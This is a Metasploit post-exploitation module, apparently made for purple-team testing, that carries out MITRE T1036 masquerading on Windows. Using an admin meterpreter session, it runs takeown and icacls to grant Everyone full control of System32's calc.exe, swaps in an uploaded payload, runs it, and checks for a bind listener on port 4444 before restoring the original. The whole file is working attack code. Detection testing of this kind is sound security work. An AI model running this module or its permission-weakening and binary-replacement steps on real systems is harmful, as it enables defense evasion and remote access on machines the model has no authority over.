##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
    include Msf::Post::File
    include Msf::Exploit::FileDropper
    include Msf::Simple::Payload
    include Msf::Post::Windows::Priv
    include Msf::Post::Windows::Purple

    def initialize(info={})
        super(update_info(info,
            'Name'          => 'Masquerading (T1036) Windows - Purple Team',
            'Description'   => %q{
              Defense Evasion:
              Masquerading occurs when a malicious executable is placed in a commonly trusted location (such as C:\Windows\System32) or named with a common name (such as "explorer.exe" or "svchost.exe") to bypass tools that trust executables by relying on file name or path. This also may be done to deceive defenders and system administrators into thinking a file is benign by name association to something that is known to be legitimate.},
            'License'       => MSF_LICENSE,
            'Author'        => [ 'Praetorian' ],
            'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1036' ] ],
            'Platform'      => [ 'win' ],
            'SessionTypes'  => [ 'meterpreter' ]
        ))
        register_options(
        [
            OptString.new('LPATH', [ false, 'Local file to copy to remote host.', Msf::Config.data_directory + "/purple/t1036/t1036_[x86|x64].exe"]),
            OptString.new('RPATH', [ true, 'Remote path to trusted location.', 'C:\\Windows\\System32\\calc.exe']),
            OptBool.new('CLEANUP', [ false, 'Clean up file created during the module.', true])
        ])
    end

    def run
        begin
          raise 'Module requires meterpreter session.' if session.type != "meterpreter"
          fail_with(Failure::NoAccess, "The current session does not have administrative rights.") if not is_admin?

          local_file_path = datastore['LPATH'].sub!(/\[x86\|x64\]/, (client.arch == ARCH_X86 ? "x86" : "x64"))
          remote_file_path = datastore['RPATH']

          # kill running instances of the masquerading file
          print_status("Killing instances of calc")
          kill_calc

          # backup original file
          begin
          backup_file_path = "C:\\Windows\\Temp\\" + remote_file_path.sub(/C:.*\\/, '')
          print_status("Backing up #{remote_file_path} to #{backup_file_path}...")
          rename_file(remote_file_path, backup_file_path)
          rescue
            # in case we don't have RWX permissions to file
            run_cmd("takeown /f #{remote_file_path}")
            run_cmd("icacls #{remote_file_path} /grant Everyone:F")
            rename_file(remote_file_path, backup_file_path)
          end
          # upload to host
          print_status("Uploading #{local_file_path} to #{remote_file_path}.")
          upload_file(remote_file_path, local_file_path)

          # run the file, check for a listener on 4444
          run_cmd(remote_file_path, false)
          output = run_cmd("netstat -ano | findstr LISTEN | findstr 4444")
          if not output.match(/4444/).nil?
            print_good("Payload opened a BIND listener on 4444.")
          else
            print_warning("Unable to find listener on port 4444. Payload execution was likely blocked.")
          end

          _cleanup(remote_file_path, backup_file_path)
          print_good("Module T1036 execution successful.")

        rescue ::Exception => e
          _cleanup(remote_file_path, backup_file_path)
          print_error("#{e.class}: #{e.message}")
          print_error("Module T1036W execution failed.")
        end
    end


    def _cleanup(remote_file_path, backup_file_path)
      if datastore['CLEANUP']
        print_status("Cleaning up...")
        print_status("Killing calc")
        kill_calc
        print_status("Removing meterpreter payload")
        rm_f(remote_file_path)
        print_status("Moving calc back")
        rename_file(backup_file_path, remote_file_path)
      end
    end
  end
